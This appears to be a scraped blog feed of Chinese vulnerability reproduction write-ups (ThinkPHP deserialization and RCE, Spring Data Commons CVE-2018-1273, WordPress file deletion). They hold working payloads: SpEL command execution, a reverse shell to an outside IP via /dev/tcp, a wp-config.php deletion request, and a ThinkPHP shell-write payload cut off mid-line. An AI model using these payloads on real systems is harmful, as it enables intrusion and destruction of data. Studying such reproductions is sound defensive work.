    <content type="html"><![CDATA[<h2 id="tp5-1-x反序列化链子"><a href="#tp5-1-x反序列化链子" class="headerlink" title="tp5.1.x反序列化链子"></a>tp5.1.x反序列化链子<a id="more"></a></h2><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php7.1+Apache+thinkphp5.1.29</span><br></pre></td></tr></table></figure><h3 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h3><p>一般来说序列化得题都是从析构函数入手，也就是<code>__destruct()</code>，全局搜索，排查可以发现可以利用的在<code>Windows.php</code></p><img src="/2020/11/02/tp5-1-x-unserialize/1.png" class=""><p>跟进<code>removeFiles()</code></p><img src="/2020/11/02/tp5-1-x-unserialize/2.png" class=""><p>可以看到存在<code>file_exists()</code>函数，当把<code>$filename</code>参数当作字符串处理时可以触发<code>__toString()</code>魔术方法，全局查找<code>__toString()</code></p><p>找到了<code>thinkphp\library\think\model\concern</code>下的Conversion.php</p><img src="/2020/11/02/tp5-1-x-unserialize/3.png" class=""><p><code>__toString()</code>会返回调用<code>toJson()</code>方法，跟进</p><img src="/2020/11/02/tp5-1-x-unserialize/4.png" class=""><p>接着会调用<code>toArray()</code>方法，继续跟进看一下该方法，我们要寻找<code>$a-&gt;function($b)</code>形式的点，$a要为可控变量，$b为可控参数</p><p>这里找到了<code>$relation-&gt;visible($name)</code></p><img src="/2020/11/02/tp5-1-x-unserialize/5.png" class=""><p>下面要看<code>$relation</code>和<code>$name</code>是否可控</p><p><code>$relation = $this-&gt;getAttr($key)</code>，跟进<code>getAttr()</code>,<code>$relation</code>变量由<code>getAttr</code>获取，<code>$this-&gt;getData</code>控制<code>$relation</code>变量</p><img src="/2020/11/02/tp5-1-x-unserialize/6.png" class=""><img src="/2020/11/02/tp5-1-x-unserialize/7.png" class=""><p>由于<code>Conversion.php</code>用的是<code>trait</code>类(trait是用来实现代码的复用的，不可以被实例化也不可以被继承),所以要找到复用了该类的点</p><img src="/2020/11/02/tp5-1-x-unserialize/8.png" class=""><p>没有别的类存在可利用的<code>visible</code>，下面就要找<code>__call()</code>魔术方法，全局搜索找到了<code>Request</code>类</p><img src="/2020/11/02/tp5-1-x-unserialize/9.png" class=""><p>这里可以利用<code>call_user_func_array</code>进行命令执行，但是这里不能直接利用，<code>$args</code>会被<code>array_inshift</code>插入一个类对象，执行只会失败。<code>Request</code>类中的<code>input</code>方法，调用相当于调用了<code>call_user_func($filter,$data)</code>,这可以跟进<code>filtervalue</code>发现，下面就是看一下调用了<code>input</code>方法的函数方法，可以找到<code>param()</code>调用了<code>input</code>方法，下面找调用了<code>param</code>方法的方法，找到了<code>isAjax()</code>方法</p><img src="/2020/11/02/tp5-1-x-unserialize/10.png" class=""><p><code>$config[&#39;var_ajax&#39;]</code>控制<code>param</code>的<code>$name</code>参数是<code>isAjax</code>方法中<code>param</code>方法的<code>$name</code>,也就控制了<code>$this-&gt;param</code>,由此就控制了<code>input</code>方法的<code>$data</code>参数，然后<code>$filter</code>变量是可控的</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;tp5-1-x反序列化链子&quot;&gt;&lt;a href=&quot;#tp5-1-x反序列化链子&quot; class=&quot;headerlink&quot; title=&quot;tp5.1.x反序列化链子&quot;&gt;&lt;/a&gt;tp5.1.x反序列化链子
    
    </summary>
    
    
    
      <category term="tp" scheme="http://yoursite.com/tags/tp/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-1273-Spring_Data_Commons</title>
    <link href="http://yoursite.com/2020/10/31/CVE-2018-1273-Spring-Data-Commons/"/>
    <id>http://yoursite.com/2020/10/31/CVE-2018-1273-Spring-Data-Commons/</id>
    <published>2020-10-31T06:00:09.000Z</published>
    <updated>2020-10-31T11:56:31.306Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Spring-Data-Commons-远程命令执行漏洞"><a href="#Spring-Data-Commons-远程命令执行漏洞" class="headerlink" title="Spring Data Commons 远程命令执行漏洞"></a>Spring Data Commons 远程命令执行漏洞<a id="more"></a></h1><h3 id="Spring-Data-Commons简介"><a href="#Spring-Data-Commons简介" class="headerlink" title="Spring Data Commons简介"></a>Spring Data Commons简介</h3><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>Spring Data Commons 1.13至1.13.10（Ingalls SR10）</li><li>Spring Data REST 2.6至2.6.10（Ingalls SR10）</li><li>Spring Data Commons 2.0到2.0.5（Kay SR5）</li><li>Spring Data REST 3.0到3.0.5（Kay SR5）</li><li>较旧的不受支持的版本也会受到影响</li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞点位于<code>MapPropertyAccessor</code>类的<code>setPropertyValue</code>方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapPropertyAccessor</span> <span class="keyword">extends</span> <span class="title">AbstractPropertyAccessor</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPropertyValue</span><span class="params">(String propertyName, @Nullable Object value)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.isWritableProperty(propertyName)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NotWritablePropertyException(<span class="keyword">this</span>.type, propertyName);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                StandardEvaluationContext context = <span class="keyword">new</span> StandardEvaluationContext();</span><br><span class="line">                context.addPropertyAccessor(<span class="keyword">new</span> MapDataBinder.MapPropertyAccessor.PropertyTraversingMapAccessor(<span class="keyword">this</span>.type, <span class="keyword">this</span>.conversionService));</span><br><span class="line">                context.setTypeConverter(<span class="keyword">new</span> StandardTypeConverter(<span class="keyword">this</span>.conversionService));</span><br><span class="line">                context.setRootObject(<span class="keyword">this</span>.map);</span><br><span class="line">                Expression expression = PARSER.parseExpression(propertyName);</span><br><span class="line">                PropertyPath leafProperty = <span class="keyword">this</span>.getPropertyPath(propertyName).getLeafProperty();</span><br><span class="line">                TypeInformation&lt;?&gt; owningType = leafProperty.getOwningType();</span><br><span class="line">                TypeInformation&lt;?&gt; propertyType = leafProperty.getTypeInformation();</span><br><span class="line">                propertyType = propertyName.endsWith(<span class="string">"]"</span>) ? propertyType.getActualType() : propertyType;</span><br><span class="line">                <span class="keyword">if</span> (propertyType != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.conversionRequired(value, propertyType.getType())) &#123;</span><br><span class="line">                    PropertyDescriptor descriptor = BeanUtils.getPropertyDescriptor(owningType.getType(), leafProperty.getSegment());</span><br><span class="line">                    <span class="keyword">if</span> (descriptor == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(String.format(<span class="string">"Couldn't find PropertyDescriptor for %s on %s!"</span>, leafProperty.getSegment(), owningType.getType()));</span><br><span class="line">                    &#125;</span><br><span class="line">                    MethodParameter methodParameter = <span class="keyword">new</span> MethodParameter(descriptor.getReadMethod(), -<span class="number">1</span>);</span><br><span class="line">                    TypeDescriptor typeDescriptor = TypeDescriptor.nested(methodParameter, <span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">if</span> (typeDescriptor == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(String.format(<span class="string">"Couldn't obtain type descriptor for method parameter %s!"</span>, methodParameter));</span><br><span class="line">                    &#125;</span><br><span class="line">                    value = <span class="keyword">this</span>.conversionService.convert(value, TypeDescriptor.forObject(value), typeDescriptor);</span><br><span class="line">                &#125;</span><br><span class="line">                expression.setValue(context, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>单从代码分析来看，整个流程是这样的</p><ul><li><code>isWritableProperty</code>检验参数名</li><li>创建<code>StandardEvaluationContext</code>,<code>PARSER.parseExpression</code>设置要解析的表达试的值为函数传入参数</li><li>最后通过<code>expression.setValue</code>进行了<code>spel</code>表达试的解析</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以下载官方示例程序</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;spring-projects&#x2F;spring-data-examples</span><br><span class="line">这里需要倒退版本</span><br></pre></td></tr></table></figure><p>借用参考文章中得代码了</p><p>当执行传入得payload时，在 <code>spel</code>中有两个变量可以访问，为<code>#this</code> 和<code>#root</code>， 我们可以通过<code>#this</code>以反射的方式执行命令</p><p><code>POST</code>请求中得参数部分，经过<code>isWritableProperty</code>校验之后会调用<code>getPropertyPath</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> PropertyPath <span class="title">getPropertyPath</span><span class="params">(String propertyName)</span> </span>&#123;</span><br><span class="line">           String plainPropertyPath = propertyName.replaceAll(<span class="string">"\\[.*?\\]"</span>, <span class="string">""</span>);</span><br><span class="line">           <span class="keyword">return</span> PropertyPath.from(plainPropertyPath, <span class="keyword">this</span>.type);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>这个函数存在逻辑漏洞，经过这个正则之后，传入的<code>name</code>和<code>name[]</code>会返回一样的东西，然后判断<code>plainPropertyPath</code>是不是<code>this.type（contriller用于接受参数的类）</code>中的属性</p><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">装有docker的centos</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;</span><br><span class="line">&#x2F;spring&#x2F;CVE-2018-1273下</span><br><span class="line">docker-compose up -d</span><br><span class="line">拉取复现环境之后就可以开始了</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>正常访问地址下的<code>/users</code>,可以看到来到一个登录界面</p><img src="/2020/10/31/CVE-2018-1273-Spring-Data-Commons/1.png" class=""><p>在利用poc之前先进入docker容器中看一下<code>tmp</code>目录下的文件信息</p><img src="/2020/10/31/CVE-2018-1273-Spring-Data-Commons/2.png" class=""><p>下面利用给的poc</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&amp;password=&amp;repeatedPassword=</span><br></pre></td></tr></table></figure><p><code>exec</code>种执行的命令可以更改成别的</p><img src="/2020/10/31/CVE-2018-1273-Spring-Data-Commons/3.png" class=""><p>执行后，回到容器中进行查看目录下是否生成了<code>success</code>文件</p><img src="/2020/10/31/CVE-2018-1273-Spring-Data-Commons/4.png" class=""><p>可以看到命令成功执行了，试试弹个shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">username[#</span><span class="bash">this.getClass().forName(<span class="string">"java.lang.Runtime"</span>).getRuntime().<span class="built_in">exec</span>(<span class="string">"/bin/bash -c <span class="variable">$@</span>|bash 0 echo bash -i &gt;&amp;/dev/tcp/111.229.84.70/1 0&gt;&amp;1"</span>)]=&amp;password=&amp;repeatedPassword=</span></span><br></pre></td></tr></table></figure><p>没有弹回来，但是应该是可以的，之后可以再试试</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul><li>2.0.x用户应升级到2.0.6</li><li>1.13.x用户应升级到1.13.11</li><li>较旧的版本应升级到受支持的分支</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;tanzu.vmware.com&#x2F;security&#x2F;cve-2018-1273</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;hac425&#x2F;p&#x2F;9656747.html</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Spring-Data-Commons-远程命令执行漏洞&quot;&gt;&lt;a href=&quot;#Spring-Data-Commons-远程命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;Spring Data Commons 远程命令执行漏洞&quot;&gt;&lt;/a&gt;Spring Data Commons 远程命令执行漏洞
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-12895</title>
    <link href="http://yoursite.com/2020/10/29/CVE-2018-12895/"/>
    <id>http://yoursite.com/2020/10/29/CVE-2018-12895/</id>
    <published>2020-10-29T13:03:17.000Z</published>
    <updated>2020-10-30T10:46:13.801Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Wordpress-lt-4-9-6-任意文件删除漏洞"><a href="#Wordpress-lt-4-9-6-任意文件删除漏洞" class="headerlink" title="Wordpress &lt;= 4.9.6 任意文件删除漏洞"></a>Wordpress &lt;= 4.9.6 任意文件删除漏洞<a id="more"></a></h2><h3 id="Wordpress简介"><a href="#Wordpress简介" class="headerlink" title="Wordpress简介"></a>Wordpress简介</h3><p>WordPress是一个以PHP和MySQL为平台的自由开源的博客软件和内容管理系统。WordPress具有插件架构和模板系统。Alexa排行前100万的网站中有超过16.7%的网站使用WordPress，根据w3tech的资料显示，约有30％的网站在使用它。WordPress是目前因特网上最流行的博客系统。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><h3 id="WORDPRESS-≤-4-9-6"><a href="#WORDPRESS-≤-4-9-6" class="headerlink" title="WORDPRESS ≤ 4.9.6"></a>WORDPRESS ≤ 4.9.6</h3><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>给出的github项目环境地址，可以用Vsplate起一个靶机环境</p><img src="/2020/10/29/CVE-2018-12895/1.png" class=""><p>在注册之后可以直接登录后台</p><img src="/2020/10/29/CVE-2018-12895/2.png" class=""><p>进入后台之后，左边栏目选择Media，Add new</p><img src="/2020/10/29/CVE-2018-12895/3.png" class=""><p>选择图片上传之后，点击edit</p><p>F12，搜索<code>post.php</code>，找到<code>_wpnonce</code>，记下该值</p><img src="/2020/10/29/CVE-2018-12895/4.png" class=""><p>下面要将<code>$meta[&#39;thumb&#39;]</code>设置成要删除的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">GET:http:<span class="comment">//37e7edd29225324ea69df6ea2dd27d25.n1.vsgo.cloud:11202/wp/wp-admin/post.php?post=6&amp;action=edit</span></span><br><span class="line">POST:action=editattachment&amp;_wpnonce=<span class="number">5563</span>cbbead&amp;thumb=../../../../wp-config.php</span><br></pre></td></tr></table></figure><img src="/2020/10/29/CVE-2018-12895/6.png" class=""><p>burp抓包看一下响应</p><img src="/2020/10/29/CVE-2018-12895/5.png" class=""><p>可以看到返回的是302，说明数据发送成功了，下面就是进行删除，点击删除按钮，抓包看一下响应</p><img src="/2020/10/29/CVE-2018-12895/7.png" class=""><p>可以看到返回的也是302，说明成功了</p><p>按照漏洞提交者提供的复现视频来看，这时候刷新页码会发现提示需要重新安装wordpress</p><img src="/2020/10/29/CVE-2018-12895/8.png" class=""><p>但是复现时尝试了十多次都没有达到同样的删除效果，开始以为是payload有问题，后来发现并不是，启用<code>VSPLATE</code>远程连接web终端，发现在<code>wp-includes/post.php</code>中漏洞利用的代码部分找不到了，也就不能成功利用该漏洞达到任意文件删除</p><p>可能这个在线平台的复现环境版本也不对，暂时先放放，后面有时间再找找</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞利用点在<code>wp-includes/post.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wp_delete_attachment</span><span class="params">( $post_id, $force_delete = false )</span> </span>&#123;</span><br><span class="line">⋮</span><br><span class="line">$meta = wp_get_attachment_metadata( $post_id );</span><br><span class="line">⋮</span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>($meta[<span class="string">'thumb'</span>]) ) &#123;</span><br><span class="line"><span class="comment">// Don't delete the thumb if another attachment uses it.</span></span><br><span class="line"><span class="keyword">if</span> (! $wpdb-&gt;get_row( $wpdb-&gt;prepare( <span class="string">"SELECT meta_id FROM $wpdb-&gt;postmeta WHERE meta_key = '_wp_attachment_metadata' AND meta_value LIKE %s AND post_id &lt;&gt; %d"</span>, <span class="string">'%'</span> . $wpdb-&gt;esc_like( $meta[<span class="string">'thumb'</span>] ) . <span class="string">'%'</span>, $post_id)) ) &#123;</span><br><span class="line">$thumbfile = str_replace(basename($file), $meta[<span class="string">'thumb'</span>], $file);</span><br><span class="line"><span class="comment">/** This filter is documented in wp-includes/functions.php */</span></span><br><span class="line">$thumbfile = apply_filters( <span class="string">'wp_delete_file'</span>, $thumbfile );</span><br><span class="line">@ unlink( path_join($uploadpath[<span class="string">'basedir'</span>], $thumbfile) );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>wp_delete_attachment</code>方法中，对于传入的<code>$meta[&#39;thumb&#39;]</code>未进行任何过滤，直接调用了<code>unlick</code>，而<code>$meta[&#39;thumb&#39;]</code>存在数据库中是一个自定义字段代替了文件名，是图片的属性之一，也就是说只要控制了<code>$meta[&#39;thumb&#39;]</code>就能够控制想要删除的文件</p><p>在这个<code>post.php</code>文件中本应该还有下面这段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>($action) &#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">case</span> <span class="string">'editattachment'</span>:</span><br><span class="line">check_admin_referer(<span class="string">'update-post_'</span> . $post_id);</span><br><span class="line">...</span><br><span class="line"><span class="comment">// Update the thumbnail filename</span></span><br><span class="line">$newmeta = wp_get_attachment_metadata( $post_id, <span class="keyword">true</span> );</span><br><span class="line">$newmeta[<span class="string">'thumb'</span>] = $_POST[<span class="string">'thumb'</span>];</span><br><span class="line">wp_update_attachment_metadata( $post_id, $newmeta );</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以看到当<code>$action=editattachment</code>时，<code>$newmeta[&#39;thumb&#39;]</code>的值来自于<code>$_POST[&#39;thumb&#39;]</code>,也就是说该值是可控的，且并未经过任何过滤直接保存到了<code>wp_update_attachment_metadata</code>数据库当中，所以上面分析的<code>$meta[&#39;thumb&#39;]</code>也是可控的，那么就能够达到任意文件删除的目的</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>利用此漏洞可以使攻击者能够删除WordPress安装的任何文件，像是数据库配置文件wp-config.php,<code>.htaccess</code>，该文件包含与安全性相关的约束，删除此文件将停用这些约束。还有像是index.php文件等。</p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>更新Wordpress到4.9.7及以上的版本</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.ripstech.com&#x2F;2018&#x2F;wordpress-file-delete-to-code-execution&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;my.oschina.net&#x2F;u&#x2F;4315114&#x2F;blog&#x2F;3914760</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Wordpress-lt-4-9-6-任意文件删除漏洞&quot;&gt;&lt;a href=&quot;#Wordpress-lt-4-9-6-任意文件删除漏洞&quot; class=&quot;headerlink&quot; title=&quot;Wordpress &amp;lt;= 4.9.6 任意文件删除漏洞&quot;&gt;&lt;/a&gt;Wordpress &amp;lt;= 4.9.6 任意文件删除漏洞
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>tp5.0-RCE</title>
    <link href="http://yoursite.com/2020/10/28/tp5-0-RCE/"/>
    <id>http://yoursite.com/2020/10/28/tp5-0-RCE/</id>
    <published>2020-10-28T06:57:06.000Z</published>
    <updated>2020-10-28T11:41:09.798Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tp5-0-amp-5-1远程RCE"><a href="#tp5-0-amp-5-1远程RCE" class="headerlink" title="tp5.0&amp;5.1远程RCE"></a>tp5.0&amp;5.1远程RCE<a id="more"></a></h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Thinkphp v5<span class="number">.1</span><span class="number">.29</span></span><br><span class="line">php7<span class="number">.0</span><span class="number">.12</span>+Apache2</span><br></pre></td></tr></table></figure><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>2018年12月9日，<code>ThinkPHP</code>团队发布了一个补丁更新，修复了一处由于路由解析缺陷导致的代码执行漏洞。该漏洞危害程度非常高，默认环境配置即可导致远程代码执行。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li><code>ThinkPHP 5.0.5-5.0.22</code></li><li><code>ThinkPHP 5.1.0-5.1.30</code></li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据漏洞介绍，该漏洞是由于路由解析导致的，先来看一下取路由的文件</p><p><code>thinkphp/library/think/Request.php</code></p><img src="/2020/10/28/tp5-0-RCE/1.png" class=""><p>这里传入的参数<code>var_pathinfo</code>,可以去配置文件中看看</p><img src="/2020/10/28/tp5-0-RCE/2.png" class=""><p><code>pathinfo</code>的值将会是以GET方式传给形参s的，追踪<code>pathinfo()</code>调用情况</p><p>在同一个文件下的<code>path()</code>方法中进行了调用</p><img src="/2020/10/28/tp5-0-RCE/3.png" class=""><p><code>path()</code>函数对传进来的<code>pathinfo</code>参数值进行了过滤，最后赋给了<code>$this-&gt;path</code>并且返回该值</p><p>追踪调用<code>path()</code>函数的地方，来到了<code>thinkphp/library/think/App.php</code></p><img src="/2020/10/28/tp5-0-RCE/4.png" class=""><p>这里进行了路由检测，返回一个Dispatch对象，跟一下check函数</p><img src="/2020/10/28/tp5-0-RCE/5.png" class=""><p>这里的Check函数最后返回的是一个实例化的<code>UrlDispatch</code>对象，传递了<code>$url</code>，跟一下<code>UrlDispatch</code>类</p><img src="/2020/10/28/tp5-0-RCE/6.png" class=""><p>传入的<code>$dispatch</code>被赋值给了<code>$this-&gt;dispatch</code>，跟一下<code>$this-&gt;dispatch</code>的最后处理，跟到了<code>init()</code>方法</p><img src="/2020/10/28/tp5-0-RCE/7.png" class=""><p><code>$this-&gt;dispatch</code>经过了<code>parseUrl</code>方法的检测，跟进，发现又传给了<code>parseUrlPath</code>,继续跟进</p><img src="/2020/10/28/tp5-0-RCE/8.png" class=""><p>利用<code>/</code>对<code>$url</code>变量进行分割，且<code>$url</code>的格式为‘模块/控制器/操作’，将<code>$url</code>分割后的值存放在<code>$path</code>变量当中，并返回到<code>parseUrl()</code>函数，最终返回到<code>Url</code>类中<code>init()</code>函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (<span class="keyword">new</span> Module(<span class="keyword">$this</span>-&gt;request, <span class="keyword">$this</span>-&gt;rule, $result))-&gt;init();</span><br></pre></td></tr></table></figure><p>路由信息数组传递到$result变量中，之后传递给了<code>Module</code>,<code>Module</code>的父类也是<code>Dispatch</code>，<code>$result</code>值传递给了变量<code>$this-&gt;dispatch</code>，随后调用<code>Module</code>类的<code>init()</code>函数对<code>$this-&gt;dispatch</code>进行处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($module &amp;&amp; $available) &#123;</span><br><span class="line">                <span class="comment">// 初始化模块</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;request-&gt;setModule($module);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;app-&gt;init($module);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'module not exists:'</span> . $module);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>模块初始化需要让<code>$available</code>为true，也就是<code>is_dir($this-&gt;app-&gt;getAppPath(). $module)</code>要成立，默认模块是即入口函数为<code>index</code>,<code>$this-&gt;dispatch</code>的值最终传递到<code>$this-&gt;controller</code>中，<code>init()</code>函数处理完过后，进入exec()函数,跟进</p><img src="/2020/10/28/tp5-0-RCE/9.png" class=""><p><code>$this-&gt;controller()</code>被传递给了<code>controller()</code>函数，跟进</p><img src="/2020/10/28/tp5-0-RCE/10.png" class=""><p><code>$name</code>可控，调用<code>parseModuleAndClass()</code>函数进行处理，继续跟进</p><img src="/2020/10/28/tp5-0-RCE/11.png" class=""><p><code>$name</code>只要有<code>\</code>，就赋给<code>$class</code>,实例化之后返回，在函数中执行完之后返回到<code>controller</code>中</p><img src="/2020/10/28/tp5-0-RCE/12.png" class=""><p>由于存在<code>$class</code>，接下去就会调用<code>__get()</code>魔术方法并返回，跟一下<code>__get()</code>魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;make($name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调用了<code>make</code>方法，跟进</p><p>make()将传入的传入的变量实例化为一个类，即<code>controller()</code>中<code>$name</code>为我们可以控制的值，可以通过构造<code>$name</code>变量来实例化任何一个类，所以我们可以通过构造<code>s=index/\think\class/method</code>来实例化<code>\think\class</code>类并且执行该类的method方法达到控制程序流</p><img src="/2020/10/28/tp5-0-RCE/13.png" class=""><p>在<code>think/Request.php</code>中找到<code>input</code>方法，可以构造payload了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;index&#x2F;think\Request&#x2F;input&amp;filter&#x3D;phpinfo&amp;data&#x3D;1</span><br></pre></td></tr></table></figure><img src="/2020/10/28/tp5-0-RCE/14.png" class=""><p>在<code>\think\template\driver\file</code>类中找到可以任意写文件的方法write</p><img src="/2020/10/28/tp5-0-RCE/15.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;index&#x2F;think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php 